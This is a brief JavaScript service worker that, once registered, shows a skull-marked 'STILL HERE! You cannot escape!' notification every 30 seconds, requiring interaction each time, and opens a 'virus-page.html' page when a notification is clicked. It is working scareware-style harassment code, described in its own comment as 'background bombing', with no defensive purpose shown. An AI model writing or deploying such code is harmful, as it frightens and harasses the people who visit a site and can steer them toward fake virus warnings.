self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

// Handle notification clicks
self.addEventListener('notificationclick', event => {
    event.notification.close();
    
    const page = event.notification.data?.page || 'virus-page.html';
    
    event.waitUntil(
        clients.openWindow(page)
    );
});

// Background bombing
setInterval(() => {
    self.registration.showNotification('💀 STILL HERE!', {
        body: 'You cannot escape!',
        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3C/svg%3E',
        requireInteraction: true
    });
}, 30000);